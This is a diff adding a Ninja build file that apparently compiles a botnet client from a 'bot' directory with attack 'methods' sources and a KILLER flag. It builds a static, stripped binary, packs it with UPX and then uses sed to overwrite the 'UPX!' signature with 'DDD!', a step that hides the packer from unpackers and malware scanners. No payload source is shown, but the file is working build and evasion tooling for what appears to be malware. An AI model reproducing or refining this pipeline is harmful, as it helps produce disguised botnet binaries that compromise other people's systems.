@@ -1,0 +1,70 @@
+compiler = clang++
+outfile = conta.bin
+
+# -mthumb
+
+cxxflags = -static -flto -Os -s -fno-ident -o $outfile -DDEBUG -DKILLER -DARCH='"x86_64"' 
+cxxflags_dev = -static -Wno-macro-redefined -DDEVMODE -o $outfile -DDEBUG -DKILLER -DNOFORK -DARCH='"x86_64"'  
+
+
+upxflags = --ultra-brute
+
+valgrind_flags = --leak-check=full --show-leak-kinds=all --tool=memcheck --track-origins=yes
+
+build_dir = bot
+source_files = *.cc methods/*.cc
+
+ninja_required_version = 1.10
+
+rule remove 
+    command = rm ./$build_dir/$outfile
+    description = REMOVE ./$build_dir/$outfile
+
+rule cxx_release    
+    command = cd $build_dir && $compiler $source_files $cxxflags
+    description = CXX (release) $source_files
+
+rule cxx_dev   
+    command = cd $build_dir && $compiler $source_files $cxxflags_dev
+    description = CXX (dev) $source_files
+    pool = console
+
+rule strip
+    command = cd $build_dir && strip $outfile
+    description = STRIP $outfile
+
+rule upx
+    command= cd $build_dir && upx $upxflags $outfile
+    description = UPX $outfile
+
+rule sed 
+    command = cd $build_dir && sed -i 's/UPX!/DDD!/g' $outfile
+    description = SED $outfile
+    pool = console
+
+rule run 
+    command = cd $build_dir ; ./$outfile  
+    description = RUN $build_dir/$outfile
+    pool = console
+
+rule valgrind
+    command = cd $build_dir; valgrind $valgrind_flags ./$outfile
+    description = RUN VALGRIND $build_dir/$outfile
+    pool = console
+
+rule info 
+    command = cd $build_dir; file $outfile ;du -h $outfile
+    pool = console
+
+
+#########################################
+build build_dev: cxx_dev 
+build build_strip: strip
+build build_upx: upx
+build build_sed: sed
+build build_run: run
+build build_release: cxx_release
+build build_info: info
+build build_valgrind: valgrind 
+build build_remove: remove
+#########################################
